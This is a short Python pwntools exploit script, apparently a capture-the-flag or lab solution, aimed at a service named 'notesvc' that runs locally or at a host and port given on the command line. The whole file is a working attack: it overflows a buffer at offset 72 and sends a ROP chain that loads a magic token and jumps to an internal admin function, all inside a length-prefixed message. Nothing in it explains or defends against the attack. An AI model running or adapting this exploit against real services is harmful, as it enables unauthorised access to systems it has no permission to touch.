#!/usr/bin/env python3
import sys
from pwn import *

POP_RDI_RET    = 0x4011ec
INTERNAL_ADMIN = 0x4011f1
TOKEN          = 0x1337C0DE
OFFSET         = 72

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process(["./notesvc"])

rop = flat(b'A' * OFFSET, p64(POP_RDI_RET), p64(TOKEN), p64(INTERNAL_ADMIN))
io.send(bytes([0x01]) + p16(len(rop)) + rop)
print(io.recvall(timeout=3).decode(errors="replace"))